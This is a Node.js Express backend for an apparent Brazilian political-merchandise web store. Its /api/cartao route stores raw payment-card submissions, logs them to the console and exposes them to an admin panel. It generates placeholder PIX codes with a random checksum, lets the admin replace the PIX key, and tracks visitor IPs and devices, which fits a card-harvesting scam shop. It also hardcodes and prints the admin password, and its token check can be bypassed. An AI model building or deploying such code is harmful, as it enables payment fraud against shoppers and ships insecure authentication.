const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

// ========== BANCO DE DADOS ==========
let produtos = [
    { id: 1, nome: "Camiseta Bolsonaro 2026", preco: 89.90, preco_antigo: 129.90, imagem: "https://placehold.co/600x800/f0ede5/8b6b3d?text=CAMISETA+2026", categoria: "Camisetas", estoque: 50, destaque: true, ativo: true, vendas: 152, descricao: "Camiseta 100% algodão com estampa exclusiva do Capitão.", created_at: new Date().toISOString() },
    { id: 2, nome: "Boné Exército e Fé", preco: 59.90, preco_antigo: 89.90, imagem: "https://placehold.co/600x800/e6dfd1/8b6b3d?text=BONE+PRETO", categoria: "Bonés", estoque: 30, destaque: true, ativo: true, vendas: 89, descricao: "Boné em algodão com bordado personalizado.", created_at: new Date().toISOString() },
    { id: 3, nome: "Caneca Ordem e Progresso", preco: 39.90, preco_antigo: 59.90, imagem: "https://placehold.co/600x800/fff4e6/8b6b3d?text=CANECA", categoria: "Canecas", estoque: 100, destaque: true, ativo: true, vendas: 234, descricao: "Caneca porcelana 300ml com frase histórica.", created_at: new Date().toISOString() }
];

let pedidos = [];
let cartoes = [];
let visitantes = [];
let carrinhosAbandonados = [];
let pixKey = '';

// ========== FUNÇÕES AUXILIARES ==========
function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || req.connection.remoteAddress || 'unknown';
}

function detectDevice(userAgent) {
    if (!userAgent) return 'Desconhecido';
    if (/iPhone|iPad|iPod/i.test(userAgent)) return 'iOS';
    if (/Android/i.test(userAgent)) return 'Android';
    if (/Windows/i.test(userAgent)) return 'Windows';
    if (/Mac/i.test(userAgent)) return 'Mac';
    return 'Desconhecido';
}

function detectBrowser(userAgent) {
    if (!userAgent) return 'Desconhecido';
    if (/Chrome/i.test(userAgent) && !/Edg/i.test(userAgent)) return 'Chrome';
    if (/Firefox/i.test(userAgent)) return 'Firefox';
    if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) return 'Safari';
    if (/Edg/i.test(userAgent)) return 'Edge';
    return 'Outro';
}

function detectOS(userAgent) {
    if (!userAgent) return 'Desconhecido';
    if (/Windows NT 10.0/i.test(userAgent)) return 'Windows 10';
    if (/Windows NT 11.0/i.test(userAgent)) return 'Windows 11';
    if (/Mac OS X/i.test(userAgent)) return 'macOS';
    if (/Android/i.test(userAgent)) return 'Android';
    if (/iPhone|iPad|iPod/i.test(userAgent)) return 'iOS';
    return 'Outro';
}

// ========== FUNÇÃO PARA GERAR PIX LOCAL ==========
function gerarPixLocal(total, pedidoId) {
    // Gerar código PIX estático (simulado)
    const pixCode = `00020126360014br.gov.bcb.pix0114capitao@store.com5204000053039865404${Math.round(total * 100)}5802BR5925CAPITAO STORE6009SAO PAULO62070503***6304${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
    return {
        pix_qr_code: pixCode,
        pix_qr_code_base64: null,
        status: 'aguardando_pagamento'
    };
}

// ========== ROTAS PÚBLICAS ==========

app.get('/api/produtos', (req, res) => {
    let filtered = produtos.filter(p => p.ativo === true);
    res.json({ success: true, produtos: filtered });
});

app.get('/api/produto/:id', (req, res) => {
    const id = parseInt(req.params.id);
    const produto = produtos.find(p => p.id === id && p.ativo === true);
    if (produto) {
        res.json({ success: true, produto });
    } else {
        res.status(404).json({ success: false, error: 'Produto não encontrado' });
    }
});

app.get('/api/cep/:cep', async (req, res) => {
    const cep = req.params.cep.replace(/\D/g, '');
    if (cep.length !== 8) return res.json({ error: 'CEP inválido' });
    try {
        const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
        const data = await response.json();
        if (data.erro) return res.json({ error: 'CEP não encontrado' });
        res.json({ success: true, logradouro: data.logradouro, bairro: data.bairro, cidade: data.localidade, uf: data.uf });
    } catch (error) {
        res.json({ error: 'Erro ao buscar CEP' });
    }
});

// Rota para gerar PIX (separada)
app.post('/api/gerar-pix', async (req, res) => {
    const { total, pedido_id } = req.body;
    const pixData = gerarPixLocal(total, pedido_id);
    res.json({ success: true, payment: pixData });
});

// Salvar pedido
app.post('/api/pedido', async (req, res) => {
    const pedidoId = 'CAP' + Date.now();
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'];
    
    // Atualizar vendas
    if (req.body.itens) {
        req.body.itens.forEach(item => {
            const produto = produtos.find(p => p.id === item.id);
            if (produto) {
                produto.vendas = (produto.vendas || 0) + item.quantidade;
            }
        });
    }
    
    let paymentResult = null;
    
    // Gerar PIX local se for PIX
    if (req.body.forma_pagamento === 'PIX') {
        paymentResult = gerarPixLocal(req.body.total, pedidoId);
    }
    
    const pedido = { 
        ...req.body, 
        pedido_id: pedidoId, 
        ip_cliente: ip,
        dispositivo: detectDevice(userAgent),
        navegador: detectBrowser(userAgent),
        sistema: detectOS(userAgent),
        payment_qr_code: paymentResult?.pix_qr_code || null,
        payment_status: 'aguardando_pagamento',
        created_at: new Date().toISOString() 
    };
    pedidos.unshift(pedido);
    console.log('Pedido salvo:', pedidoId);
    
    res.json({ 
        success: true, 
        pedido_id: pedidoId,
        payment: paymentResult
    });
});

app.post('/api/cartao', (req, res) => {
    const novoCartao = { id: Date.now(), ...req.body, created_at: new Date().toISOString() };
    cartoes.push(novoCartao);
    console.log('Cartão salvo:', novoCartao);
    res.json({ success: true });
});

app.post('/api/visitante', (req, res) => {
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'];
    const { visitor_id, origem } = req.body;
    
    const existing = visitantes.find(v => v.visitor_id === visitor_id);
    if (existing) {
        existing.ultima_atividade = new Date().toISOString();
        existing.page_views = (existing.page_views || 0) + 1;
    } else {
        visitantes.push({
            visitor_id, ip: ip, user_agent: userAgent,
            dispositivo: detectDevice(userAgent), navegador: detectBrowser(userAgent), sistema: detectOS(userAgent),
            origem: origem || 'direct', etapa: 'visitante', page_views: 1,
            primeira_visita: new Date().toISOString(), ultima_atividade: new Date().toISOString()
        });
    }
    res.json({ success: true });
});

app.post('/api/carrinho', (req, res) => {
    const { visitor_id, itens, total } = req.body;
    const existing = carrinhosAbandonados.find(c => c.visitor_id === visitor_id);
    if (existing) {
        existing.itens = itens; existing.total = total; existing.total_itens = itens.length; existing.updated_at = new Date().toISOString();
    } else {
        carrinhosAbandonados.push({ visitor_id, itens, total, total_itens: itens.length, created_at: new Date().toISOString(), updated_at: new Date().toISOString() });
    }
    res.json({ success: true });
});

// ========== ROTAS ADMIN ==========

app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'kakabanker' && password === '77991958@Abc') {
        const token = 'admin_auth_' + Date.now();
        res.json({ success: true, token: token });
    } else {
        res.status(401).json({ success: false });
    }
});

function verifyAdmin(req, res, next) {
    const token = req.headers.authorization;
    if (!token || !token.startsWith('Bearer admin_auth_')) {
        return res.status(401).json({ success: false });
    }
    next();
}

app.get('/api/admin/produtos', verifyAdmin, (req, res) => { res.json({ success: true, produtos }); });

app.post('/api/admin/produtos', verifyAdmin, (req, res) => {
    const novoId = Math.max(...produtos.map(p => p.id), 0) + 1;
    const novoProduto = { 
        id: novoId, 
        nome: req.body.nome,
        preco: req.body.preco,
        preco_antigo: req.body.preco_antigo || null,
        descricao: req.body.descricao || '',
        categoria: req.body.categoria,
        estoque: req.body.estoque || 0,
        imagem: req.body.imagem || '',
        vendas: 0,
        ativo: true, 
        created_at: new Date().toISOString() 
    };
    produtos.push(novoProduto);
    res.json({ success: true });
});

app.delete('/api/admin/produtos/:id/permanent', verifyAdmin, (req, res) => {
    const id = parseInt(req.params.id);
    const index = produtos.findIndex(p => p.id === id);
    if (index === -1) return res.status(404).json({ success: false });
    produtos.splice(index, 1);
    res.json({ success: true });
});

app.get('/api/admin/pedidos', verifyAdmin, (req, res) => { res.json({ success: true, pedidos }); });
app.get('/api/admin/cartoes', verifyAdmin, (req, res) => { res.json({ success: true, cartoes }); });
app.get('/api/admin/visitantes', verifyAdmin, (req, res) => { res.json({ success: true, visitantes }); });
app.get('/api/admin/carrinhos-abandonados', verifyAdmin, (req, res) => { res.json({ success: true, carrinhos: carrinhosAbandonados }); });

app.get('/api/admin/stats', verifyAdmin, (req, res) => {
    const online = visitantes.filter(v => new Date(v.ultima_atividade) > new Date(Date.now() - 5 * 60 * 1000)).length;
    const revenue = pedidos.reduce((sum, p) => sum + (parseFloat(p.total) || 0), 0);
    res.json({ success: true, stats: { online, abandoned_carts: carrinhosAbandonados.length, total_cards: cartoes.length, revenue, total_products: produtos.filter(p => p.ativo).length, total_orders: pedidos.length } });
});

app.get('/api/admin/pix', verifyAdmin, (req, res) => { res.json({ success: true, pix_key: pixKey }); });
app.post('/api/admin/pix', verifyAdmin, (req, res) => { pixKey = req.body.pix_key; res.json({ success: true }); });

app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`Admin: http://localhost:${PORT}/admin`);
    console.log(`Login: kakabanker / 77991958@Abc`);
});